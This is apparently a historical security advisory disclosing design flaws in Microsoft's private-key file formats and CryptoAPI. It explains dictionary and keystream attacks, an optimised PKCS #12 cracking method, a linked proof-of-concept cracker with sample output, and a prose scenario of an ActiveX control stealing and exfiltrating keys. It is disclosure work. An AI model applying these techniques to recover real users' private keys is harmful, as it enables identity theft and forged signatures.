 Summary
 -------

 Microsoft uses two different file formats to protect users private
 keys, the
 original (unnamed) format which was used in older versions of MSIE,
 IIS, and
 other software and which is still supported for
 backwards-compatibility reasons
 in newer versions, and the newer PFX/PKCS #12 format.  Due to a number
 of
 design and implementation flaws in Microsofts software, it is possible
 to break
 the security of both of these formats and recover users private keys,
 often in
 a matter of seconds.  In addition, a major security hole in Microsofts
 CryptoAPI means that many keys can be recovered without even needing
 to break
 the encryption.  These attacks do not rely for their success on the
 presence of
 weak, US-exportable encryption, they also affect US versions.

 As a result of these flaws, no Microsoft internet product is capable
 of
 protecting a users keys from hostile attack.  By combining the attacks
 described below with widely-publicised bugs in MSIE which allow
 hostile sites
 to read the contents of users hard drives or with an ActiveX control,
 a victim
 can have their private key sucked off their machine and the encryption
 which
 "protects" it broken at a remote site without their knowledge.

 Once an attacker has obtained a users private key in this manner, they
 have
 effectively stolen their (digitial) identity, and can use it to
 digitally sign
 contracts and agreements, to recover every encryption session key it's
 ever
 protected in the past and will ever protect in the future, to access
 private
 and confidential email, and so on and so on.  The ease with which this
 attack
 can be carried out represents a critical weakness which compromises
 all other
 encryption components on web servers and browsers - once the private
 key is
 compromised, all security services which depend on it are also
 compromised.

 A really clever attacker might even do the following:

 - Use (say) an MSIE bug to steal someones ActiveX code signing key.
 - Decrypt it using one of the attacks described below.
 - Use it to sign an ActiveX control which steals other peoples keys.
 - Put it on a web page and wait.

 On the remote chance that the ActiveX control is discovered (which is
 extremely
 unlikely, since it runs and deletes itself almost instantly, and can't
 be
 stopped even with the highest "security" setting in MSIE), the attack
 will be
 blamed on the person the key was stolen from rather than the real
 attacker.

 This demonstrates major problems in both Microsoft's private key
 security
 (an attacker can decrypt, and therefore misuse, your private key), and
 ActiveX
 security (an attacker can create an effectively unstoppable malicious
 ActiveX
 control and, on the remote chance that it's ever discovered, ensure
 that
 someone else takes the blame).

 Background
 ----------

 About a year ago I posted an article on how to break Netscape's (then)
 server
 key encryption to the cypherpunks list (Netscape corrected this
 problem at
 about the same time as I posted the article).  However more than a
 year after
 the code was published, and 2 1/2 years after a similar problem with
 Windows
 .PWL file encryption was publicised, Microsoft are still using exactly
 the
 same weak, easily-broken data format to "protect" users private keys.
 To
 break this format I simply dusted off my year-old software, changed
 the
 "Netscape" strings to "Microsoft", and had an encryption-breaker which
 would
 recover most private keys "protected" with this format in a matter of
 seconds.

 In addition to the older format, newer Microsoft products also support
 the
 PKCS #12 format (which they originally called PFX), which Microsoft
 render as
 useless as the older format by employing the RC2 cipher with a 40-bit
 key.  In
 a truly egalitarian manner, this same level of "security" is used
 worldwide,
 ensuring that even US users get no security whatsoever when storing
 their
 private keys.  However even RC2/40 can take awhile to break (the exact
 definition of "a while" depends on how much computing power you have
 available,
 for most non-funded attackers it ranges from a few hours to a few
 days).
 Fortunately, there are enough design flaws in PKCS #12 and bugs in
 Microsofts
 implementation to ensure that we can ignore the encryption key size.
 This has
 the useful - to an attacker - side-effect that even if Microsoft
 switch to
 using RC2/128 or triple DES for the encryption, it doesn't make the
 attackers
 task any more difficult.  By combining the code to break the PKCS #12
 format
 with the code mentioned above which breaks the older format, we obtain
 a single
 program which, when run on either type of key file, should be able to
 recover
 the users private keys from most files in a matter of seconds.

 A (somewhat limited) example of this type of program is available in
 source
 code form from <http://www.cs.auckland.ac.nz/~pgut001/pubs/breakms.c>.
 Because
 it's meant as a proof-of-concept program it's somewhat crude, and
 restricted to
 recovering passwords which are single dictionary words.  Note: This
 does not
 mean that using (say) two words as a password instead of one will
 protect your
 private key.  All it means is that I haven't bothered to write
 anything more
 sophisticated - no doubt anyone who was serious about this could adapt
 something like cracklib's password-generation rules and routines to
 provide a
 more comprehensive and powerful type of attack.  Similarly, by making
 trivial
 changes to the key file data format it's possible to fool the program
 until
 someone makes an equally trivial change to the program to track the
 format
 change - this is meant as a demonstrator only, not a do-everything
 encryption
 breaker.

 To use the program, compile and invoke it with:

   breakms <Microsoft key file <word list file

 Here's what the output should look like (some of the lines have been
 trimmed a
 bit):

   File is a PFX/PKCS #12 key file.
   Encrypted data is 1048 bytes long.
   The password which was used to encrypt this Microsoft PFX/PKCS #12
 file is
     'orthogonality'.

 Someone sent me a test Microsoft key they had created with MSIE 3.0
 and the
 program took just a few seconds to recover the password used to
 encrypt the
 file.

 One excuse offered by Microsoft is that Windows NT has access control
 lists
 (ACL's) for files which can be used to protect against this attacks
 and the one
 described below.  However this isn't notably useful: Most users will
 be running
 Windows '95 which doesn't have ACL's, of the small remainder using NT
 most
 won't bother setting the ACL's, and in any case since the attack is
 coming from
 software running as the current user (who has full access to the
 file), the
 ACL's have no effect.  The ACL issue is merely a red herring, and
 offers no
 further protection.

 Further Attacks (information provided by Steve Henson
 <shenson@bigfoot.com)
 ---------------

 There is a further attack possible which works because Microsoft's
 security
 products rely on the presence of the Microsoft CryptoAPI, which has a
 wonderful
 function called CryptExportKey().  This function hands over a users
 private key
 to anyone who asks for it.  The key is encrypted under the current
 user, so any
 other program running under the user can obtain their private key with
 a single
 function call.  For example an ActiveX control on a web page could ask
 for the
 current users key, ship it out to a remote site, and then delete
 itself from
 the system leaving no trace of what happened, a bit like the mail.exe
 program I
 wrote about 2 years ago which did the same thing for Windows
 passwords.  If the
 control is signed, there's no way to stop it from running even with
 the highest
 security level selected in MSIE, and since it immediately erases all
 traces of
 its existence the code signing is worthless.

 Newer versions of the CryptoAPI which come with MSIE 4 allow the user
 to set a
 flag (CRYPT_USER_PROTECTED) which specifies that the key export
 function should
 be protected with no protection (the default), user notification, or
 password
 protection.  However the way this is implemented makes it pretty much
 useless.
 Firstly, if the certificate request script used to generate the key
 doesn't set
 this flag, you end up with the default of "no protection" (and the
 majority of
 users will just use the default of "no protection" anyway).  Although
 Microsoft
 claim that "reputable CA's won't forget to set this flag", a number of
 CA's
 tested (including Verisign) don't bother to set it (does this mean
 that
 Microsoft regard Verisign as a disreputable CA? :-).  Because of this,
 they
 don't even provide the user with the option of selecting something
 other than
 "no security whatsoever".

 In addition at least one version of CryptoAPI would allow the "user
 notification" level of security to be bypassed by deleting the
 notification
 dialog resource from memory so that the call would quietly fail and
 the key
 would be exported anyway (this is fairly tricky to do and involves
 playing with
 the CPU's page protection mechanism, there are easier ways to get the
 key than
 this).

 Finally, the "password protection" level of security asks for the
 password a
 whopping 16 (yes, *sixteen*) times when exporting the key, even though
 it only
 needs to do this once.  After about the fifth time the user will
 probably click
 on the "remember password" box, moving them back to zero security
 until they
 reboot the machine and clear the setting, since the key will be
 exported with
 no notification or password check once the box is clicked.

 To check which level of security you have, try exporting your key
 certificate.
 If there's no warning/password dialog, you have zero security for your
 key, and
 don't even need to use the encryption-breaking technique I describe
 elsewhere
 in this article.  Any web page you browse could be stealing your key
 (through
 an embedded ActiveX control) without you ever being aware of it.

 Details on Breaking the Older Format
 ------------------------------------

 The Microsoft key format is very susceptible to both a dictionary
 attack and to
 keystream recovery.  It uses the PKCS #8 format for private keys,
 which
 provides a large amount of known plaintext at the start of the data,
 in
 combination with RC4 without any form of IV or other preprocessing
 (even though
 PKCS #8 recommends that PKCS #5 password-based encryption be used),
 which means
 you can recover the first 100-odd bytes of key stream with a simple
 XOR (the
 same mistake they made with their .PWL files, which was publicised 2
 1/2 years
 earlier).  Although the password is hashed with MD5 (allowing them to
 claim the
 use of a 128-bit key), the way the key is applied provides almost no
 security.
 This means two things:

 1. It's very simple to write a program to perform a dictionary attack
 on the
    server key (it originally took me about half an hour using
 cryptlib,
    <http://www.cs.auckland.ac.nz/~pgut001/cryptlib/>, another half hour
 to rip
    the appropriate code out of cryptlib to create a standalone
 program, and a
    few minutes to retarget the program from Netscape to Microsoft).

 2. The recovered key stream from the encrypted server key can be used
 to
    decrypt any other resource encrypted with the server password,
 *without
    knowing the password*.  This is because there's enough known
 plaintext
    (ASN.1 objects, object identifiers, and public key components) at
 the start
    of the encrypted data to recover large quantities of key stream.
 This means
    that even if you use a million-bit encryption key, an attacker can
 still
    recover at least the first 100 bytes of anything you encrypt
 without needing
    to know your key (Frank Stevenson's glide.exe program uses this to
 recover
    passwords from Windows .PWL files in a fraction of a second).

 The problem here is caused by a combination of the PKCS #8 format
 (which is
 rather nonoptimal for protecting private keys) and the use of RC4 to
 encryt
 fixed, known plaintext.  Since everything is constant, you don't even
 need to
 run the password-transformation process more than once - just store a
 dictionary of the resulting key stream for each password in a
 database, and
 you can break the encryption with a single lookup (this would be
 avoided by
 the use of PKCS #5 password-based encryption, which iterates the key
 setup and
 uses a salt to make a precomputed dictionary attack impossible.  PKCS
 #5
 states that its primary intended application is for protecting private
 keys,
 but Microsoft (and Netscape) chose not to use this and went with
 straight RC4
 encryption instead).  This is exactly the same problem which came up
 with
 Microsoft's .PWL file encryption in 1995, and yet in the 2 1/2 years
 since I
 exposed this problem they still haven't learnt from their previous
 mistakes.

 For the curious (and ASN.1-aware), here's what the data formats look
 like.
 First there's the outer encapsulation which Microsoft use to wrap up
 the
 encrypted key:

   MicrosoftKey ::= SEQUENCE {
     identifier          OCTET STRING ('private-key'),
     encryptedPrivateKeyInfo
                         EncryptedPrivateKeyInfo
     }

 Inside this is a PKCS #8 private key:

   EncryptedPrivateKeyInfo ::= SEQUENCE {
     encryptionAlgorithm EncryptionAlgorithmIdentifier,
     encryptedData       EncryptedData
     }

   EncryptionAlgorithmIdentifier ::= AlgorithmIdentifier

   EncryptedData = OCTET STRING

 Now the EncryptionAlgorithmIdentifier is supposed to be something like
 pbeWithMD5AndDES, with an associated 64-bit salt and iteration count,
 but
 Microsoft (and Netscape) ignored this and used straight rc4 with no
 salt or
 iteration count.  The EncryptedData decrypts to:

   PrivateKeyInfo ::= SEQUENCE {
     version             Version
     privateKeyAlgorithm PrivateKeyAlgorithmIdentifier
     privateKey          PrivateKey
     attributes    [ 0 ] IMPLICIT Attributes OPTIONAL
     }

   Version ::= INTEGER

   PrivateKeyAlgorithmIdentifier ::= AlgorithmIdentifier

   PrivateKey ::= OCTET STRING

   Attributes ::= SET OF Attribute

 (and so on and so on, I haven't bothered going down any further).  One
 thing
 worth noting is that Microsoft encode the AlgorithmIdentifier
 incorrectly by
 omitting the parameters, these should be encoded as a NULL value if
 there are
 no parameters. In this they differ from Netscape, indicating that both
 companies managed to independently come up with the same broken key
 storage
 format.  Wow.

 For people picking apart the inner key, Microsoft also encode their
 ASN.1
 INTEGERs incorrectly, so you need to be aware of this when reading out
 the
 data.

 Details on Breaking the PFX/PKCS #12 Format
 -------------------------------------------

 The PFX/PKCS #12 format is vastly more complex (and braindamaged) than
 the
 older format.  You can find an overview of some of the bletcherousness
 in this
 format at <http://www.cs.auckland.ac.nz/~pgut001/pfx.html>.  After
 Microsoft
 originally designed the format (calling it PFX) and presented it to
 the world
 as a fait accompli, cleanup crews from other companies rushed in and
 fixed some
 of the worst problems and security flaws.  However by this time
 Microsoft had
 already shipped implementations which were based on the earlier
 version with
 all its flaws and holes, and didn't want to change their code any
 more.  A
 side-effect of this was that to be compatible, other vendors had to
 copy
 Microsofts bugs rather than produce an implementation in accordance
 with the
 standard.  Newer versions of the standard have now been amended to
 define the
 implementation bugs as a part of the standard.

 Anyway, as a result of this it's possible to mount three independant
 types of
 attack on Microsoft's PFX/PKCS #12 keys:

 1. Attack the RC2/40 encryption used in all versions, even the US-only
 one.
 2. Attack the MAC used to protect the entire file.  Since the same
 password is
    used for the MAC and the encrypted key, recovering the MAC password
 also
    recovers the password used to encrypt the private key.  The cleanup
 crews
    added a MAC iteration count to make this attack harder, but
 Microsoft
    ignored it.
 3. Attack the private key encryption key directly.  Like the MAC's,
 this also
    has an interation count.  Microsoft don't use it.

 Even if one of these flaws is fixed, an attacker can simply switch
 over and
 concentrate on a different flaw.

 I decided to see which one could be implemented the most efficiently.
 Obviously (1) was out (you need to perform 2^39 RC2 key schedules on
 average
 to find the key), which left (2) and (3).  With the refinements I'm
 about to
 describe, it turns out that an attack on the private key encryption is
 significantly more efficient than an attack on the MAC.

 To understand how the attack works, you need to look at how PKCS #12
 does its
 key processing.  The original PFX spec included only some very vague
 thoughts
 on how to do this.  In later PKCS #12 versions this evolved into a
 somewhat
 garbled offshoot of the PKCS #5 and TLS key processing methods.  To
 decrypt
 data which is "protected" using the PKCS #12 key processing, you need
 to do the
 following:

   construct a 64-byte "diversifier" (which differs depending on
 whether you
         want to set up a key or an IV) and hash it;
   stretch the salt out to 64 bytes and hash it after the diversifier
 hash;
   stretch the password out to 64 bytes (using incorrect processing of
 the
         text string, this is one of Microsofts implementation bugs
 which has
         now become enshrined in the standard) and hash it after the
 salt hash;
   complete the hash and return the resulting value as either the key
 or the
         IV, depending on the diversifier setting;

 (it's actually rather more complex than that, this is a stripped-down
 version
 which is equivalent to what Microsoft use).

 This process is carried out twice, once for the key and once for the
 IV.  The
 hashing is performed using SHA-1, and each of the two invocations of
 the
 process require 4 passes through the SHA-1 compression function, for a
 total
 of 8 passes through the function.  Because the PKCS #12 spec
 conveniently
 requires that all data be stretched out to 64 bytes, which happens to
 be the
 data block size for SHA-1, there's no need for the input processing
 which is
 usually required for SHA-1 so we can strip this code out and feed the
 data
 directly into the compression function.  Thus the compression function
 (along
 with the RC2 key setup) is the limiting factor for the speed of an
 attack.
 Obviously we want to reduce the effort required as much as possible.

 As it turns out, we can eliminate 6 of the 8 passes, cutting our
 workload by
 75%.  First, we observe that the the diversifier is a constant value,
 so
 instead of setting it up and hashing it, we precompute the hash and
 store the
 hash value.  This eliminates the diversifier, and one pass through
 SHA-1.

 Next, we observe that the salt never changes for the file being
 attacked, so
 again instead of setting it up and hashing it, we precompute the hash
 and
 store the hash value.  This eliminates the diversifier, and another
 pass
 through SHA-1.

 Finally, all that's left is the password.  This requires two passes
 through
 the compression function, one for the password (again conveniently
 stretched
 to 64 bytes) and a second one to wrap up the hashing.

 In theory we'd need to repeat this process twice, once to generate the
 decryption key and a second time to generate the decryption IV which
 is used
 to encrypt the data in CBC mode.  However the start of the decrypted
 plaintext
 is:

   SEQUENCE {
     SEQUENCE {
       OBJECT IDENTIFIER,
           ...

 and the SEQUENCE is encoded as 30 82 xx xx (where xx xx are the length
 bytes).  This means the first 8 bytes will be 30 82 xx xx 30 82 xx xx,
 and
 will be followed by the object identifier.  We can therefore skip the
 first 8
 bytes and, using them as the IV, decrypt the second 8 bytes and check
 for the
 object identifier.  This eliminates the second PKCS #12 key
 initialisation
 call which is normally required to generate the IV.

 As this analysis (and the program) shows, Microsoft managed to design
 a
 "security" format in which you can eliminate 75% of the encryption
 processing
 work while still allowing an attack on the encrypted data.  To make it
 even
 easier for an attacker, they then dumbed the key down to only 40 bits,
 even in
 the US-only version of the software.  In fact this doesn't really have
 any
 effect on security, even if they used 128-bit RC2 or triple DES or
 whatever,
 it would provide no extra security thanks to the broken key
 processing.
